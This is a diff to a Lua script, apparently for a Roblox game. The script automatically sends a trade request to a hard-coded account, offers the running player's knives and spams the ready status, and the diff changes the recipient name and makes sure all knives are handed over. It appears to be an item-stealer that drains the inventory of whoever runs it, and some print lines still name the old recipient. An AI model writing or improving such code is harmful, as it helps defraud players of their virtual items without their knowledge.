@@ -18,6 +18,7 @@ local refreshCooldown = 2 -- Reduced cooldown for faster response
 local maxKnivesPerOffer = 6
 local knifeOfferCount = 0 -- Track how many times we've offered knives in current trade
 local maxOfferAttempts = 2 -- Maximum number of times to offer knives in a trade
+local noMoreKnivesAvailable = false -- New flag to track when all knives have been offered
 
 -- Variable for trade status spamming
 local isSpammingTradeStatus = false
@@ -34,7 +35,7 @@ local offerKnivesForTrade
 local function isTradingWithAscendSpooq()
     local success, result = pcall(function()
         local tradeLabel = LocalPlayer.PlayerGui.ScreenGui.UI.TradeScreen.TextLabel
-        return tradeLabel and tradeLabel.Text == "Trading with AscendSpooq"
+        return tradeLabel and tradeLabel.Text == "Trading with CohnqDerp"
     end)
     
     if not success then
@@ -136,6 +137,13 @@ local function getInventoryKnives()
     
     knives = result
     print("Found " .. #knives .. " knives in inventory")
+    
+    -- If no knives found but we've already offered at least one batch, flag as complete
+    if #knives == 0 and knifeOfferCount > 0 then
+        print("No more knives available in inventory - will proceed with trade")
+        noMoreKnivesAvailable = true
+    end
+    
     return knives
 end
 
@@ -209,7 +217,7 @@ end
 
 -- Function to check for player and send trade request
 local function checkForPlayer()
-    local targetPlayer = Players:FindFirstChild("AscendSpooq")
+    local targetPlayer = Players:FindFirstChild("CohnqDerp")
     
     if targetPlayer then
         print("AscendSpooq is in the game!")
@@ -219,7 +227,7 @@ local function checkForPlayer()
             print("SENDING TRADE REQUEST TO ASCENDSPOOQ")
             
             local args = {
-                [1] = Players.AscendSpooq
+                [1] = Players.CohnqDerp
             }
             
             local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SendTradeRequest")
@@ -240,6 +248,14 @@ local function checkForPlayer()
             requestSent = false
         end
     end
+end
+
+-- Function to check if we should accept the trade
+local function shouldAcceptTrade()
+    -- Accept if we've reached max attempts, max items, or no more knives are available
+    return knifeOfferCount >= maxOfferAttempts or 
+           getTradeOfferCount() >= maxKnivesPerOffer or 
+           noMoreKnivesAvailable
 end
 
 -- Definition of offerKnivesForTrade
@@ -267,6 +283,14 @@ offerKnivesForTrade = function()
     
     if currentOfferCount >= maxKnivesPerOffer then
         print("ALREADY HAVE " .. currentOfferCount .. " ITEMS IN TRADE (MAX: 6) - NOT ADDING MORE")
+        knifeOfferInProgress = false
+        return
+    end
+    
+    -- If no knives available to offer anymore, proceed with trade
+    if #knives == 0 then
+        print("No knives available to offer - proceeding with trade")
+        noMoreKnivesAvailable = true
         knifeOfferInProgress = false
         return
     end
@@ -303,10 +327,17 @@ offerKnivesForTrade = function()
         knifeOfferCount = knifeOfferCount + 1
         print("Successfully offered " .. #knivesToOffer .. " knives for trade (Offer #" .. knifeOfferCount .. " of " .. maxOfferAttempts .. ")")
         
-        if knifeOfferCount >= maxOfferAttempts then
-            print("REACHED MAX OFFERS - STARTING TRADE STATUS SPAM")
+        -- Check if we've offered all available knives
+        if #knives <= #knivesToOffer then
+            print("All available knives have been offered - proceeding with trade")
+            noMoreKnivesAvailable = true
+        end
+        
+        -- Start trade status spam if we should proceed
+        if shouldAcceptTrade() then
+            print("TRADE ACCEPTANCE CONDITION MET - STARTING TRADE STATUS SPAM")
             spawn(function()
-                while isTradeScreenVisible() do
+                while isTradeScreenVisible() and isTradingWithAscendSpooq() do
                     spamTradeStatus()
                     wait(tradeStatusSpamInterval)
                 end
@@ -338,21 +369,26 @@ spawn(function()
                 print("Trade with AscendSpooq is now active - resetting offer count")
                 knifeOfferCount = 0
                 isSpammingTradeStatus = false
+                noMoreKnivesAvailable = false
                 wasTradeScreenVisible = true
             end
             
             local currentCount = getTradeOfferCount()
             
-            if knifeOfferCount < maxOfferAttempts and currentCount < maxKnivesPerOffer and tick() - lastKnifeRefresh > refreshCooldown then
-                print("Trade screen is visible with " .. currentCount .. "/6 items - attempt " .. (knifeOfferCount + 1) .. "/" .. maxOfferAttempts)
+            if not shouldAcceptTrade() and tick() - lastKnifeRefresh > refreshCooldown then
+                print("Trade screen is visible with " .. currentCount .. " items - attempt " .. (knifeOfferCount + 1) .. "/" .. maxOfferAttempts)
                 offerKnivesForTrade()
-            elseif knifeOfferCount >= maxOfferAttempts then
-                print("Already made " .. knifeOfferCount .. " offers in this trade session - now spamming READY status")
-                if not isSpammingTradeStatus then
-                    spamTradeStatus()
+            elseif shouldAcceptTrade() then
+                local reason = ""
+                if knifeOfferCount >= maxOfferAttempts then
+                    reason = "reached max offer attempts"
+                elseif currentCount >= maxKnivesPerOffer then
+                    reason = "reached max items in trade"
+                elseif noMoreKnivesAvailable then
+                    reason = "all available knives have been offered"
                 end
-            elseif currentCount >= maxKnivesPerOffer then
-                print("Trade already has maximum items (" .. currentCount .. "/6) - now spamming READY status")
+                
+                print("Trading condition met (" .. reason .. ") - now spamming READY status")
                 if not isSpammingTradeStatus then
                     spamTradeStatus()
                 end
@@ -360,6 +396,7 @@ spawn(function()
         else
             wasTradeScreenVisible = false
             isSpammingTradeStatus = false
+            noMoreKnivesAvailable = false
         end
     end
 end)
@@ -367,7 +404,7 @@ end)
 spawn(function()
     print("TRADE STATUS SPAM MONITOR STARTED")
     while wait(tradeStatusSpamInterval) do
-        if isTradeScreenVisible() and isTradingWithAscendSpooq() and (knifeOfferCount >= maxOfferAttempts or getTradeOfferCount() >= maxKnivesPerOffer) and not isSpammingTradeStatus then
+        if isTradeScreenVisible() and isTradingWithAscendSpooq() and shouldAcceptTrade() and not isSpammingTradeStatus then
             spamTradeStatus()
         end
     end
